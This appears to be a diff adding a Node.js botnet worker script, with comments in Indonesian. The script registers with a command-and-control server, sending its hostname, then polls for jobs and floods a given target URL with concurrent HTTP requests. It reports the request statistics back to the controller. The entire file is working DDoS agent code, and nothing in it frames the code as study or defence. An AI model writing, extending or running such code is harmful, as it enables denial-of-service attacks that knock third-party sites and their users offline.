@@ -1,0 +1,93 @@
+// language: JavaScript (Node 18+), file: node.js
+// *node worker — polling C2, eksekusi flood, lapor stats*
+
+const os = require('os');
+const crypto = require('crypto');
+
+const C2_URL = 'http://IP_C2_LO:8080';
+const NODE_ID = crypto.randomBytes(4).toString('hex');
+const POLL_INTERVAL = 3000;
+
+async function flood(url, duration, concurrency) {
+    const stats = { ok: 0, fail: 0, total: 0 };
+    const stopAt = Date.now() + duration * 1000;
+
+    async function worker() {
+        while (Date.now() < stopAt) {
+            try {
+                const ctrl = new AbortController();
+                const t = setTimeout(() => ctrl.abort(), 5000);
+                const res = await fetch(url, { signal: ctrl.signal });
+                clearTimeout(t);
+                await res.text();
+                stats.ok++;
+            } catch {
+                stats.fail++;
+            }
+            stats.total++;
+        }
+    }
+
+    await Promise.all(Array.from({ length: concurrency }, () => worker()));
+    return stats;
+}
+
+async function register() {
+    try {
+        const res = await fetch(`${C2_URL}/register`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ node_id: NODE_ID, hostname: os.hostname() })
+        });
+        return res.ok;
+    } catch {
+        return false;
+    }
+}
+
+async function poll() {
+    try {
+        const res = await fetch(`${C2_URL}/poll?node_id=${NODE_ID}`);
+        return await res.json();
+    } catch {
+        return null;
+    }
+}
+
+async function report(job_id, stats) {
+    try {
+        await fetch(`${C2_URL}/report`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ node_id: NODE_ID, job_id, stats })
+        });
+    } catch {}
+}
+
+async function main() {
+    while (true) {
+        if (await register()) {
+            console.log(`registered as ${NODE_ID}`);
+            break;
+        }
+        await new Promise(r => setTimeout(r, 5000));
+    }
+
+    while (true) {
+        const resp = await poll();
+        if (resp && resp.job) {
+            const job = resp.job;
+            if (job.stop) {
+                // kalo butuh stop mid-flood, perlu mekanisme abort terpisah
+                continue;
+            }
+            console.log(`job ${job.job_id} — ${job.url}`);
+            const stats = await flood(job.url, job.duration, job.concurrency);
+            await report(job.job_id, stats);
+            console.log(`done:`, stats);
+        }
+        await new Promise(r => setTimeout(r, POLL_INTERVAL));
+    }
+}
+
+main();
